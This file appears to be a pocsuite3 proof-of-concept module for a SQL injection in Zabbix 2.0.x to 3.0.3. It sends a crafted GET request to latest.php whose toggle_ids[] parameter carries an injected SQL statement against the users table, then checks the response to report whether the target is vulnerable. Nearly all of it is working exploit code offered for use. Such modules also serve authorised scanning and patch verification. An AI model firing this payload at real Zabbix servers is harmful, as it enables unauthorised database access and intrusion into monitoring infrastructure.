#!/usr/bin/env python
#_*_ encoding: utf-8 _*_
from pocsuite3.api import register_poc
from pocsuite3.api import requests
from pocsuite3.api import Output
from pocsuite3.api import logger
from pocsuite3.api import POCBase

class Zabbix(POCBase):
    vulID = 'N/A'
    version = '1.0'
    author = 'big04dream'
    vulDate = ''
    createDate = '2019-11-06'
    updateDate = '2019-11-06'
    references = ['']
    name = 'Zabbix 2.0.x <= 3.0.3 - latest SQL Injection'
    appPowerLink = ''
    appName = 'Zabbix'
    appVersion = 'Zabbix 2.0.x <= 3.0.3'
    vulType = 'SQL Injection'
    desc = ''' 
    Zabbix 2.0.x <= 3.0.3 - latest SQL注入漏洞
    '''

    @property
    def _get_url(self):
        if self.url[-1] == '/':
            url = self.url
        else:
            url = self.url + '/'
        return url

    def _verify(self):
        result = {}
        payload = 'latest.php?output=ajax&sid=&favobj=toggle&toggle_open_state=1&toggle_ids[]=15385); select * from users where (1=1'
        try:
            url = self._get_url + payload
            response = requests.get(url)
            if 'web.latest.toggle' in response.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['Payload'] = payload
        except Exception as e:
            logger.info(e)
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

register_poc(Zabbix)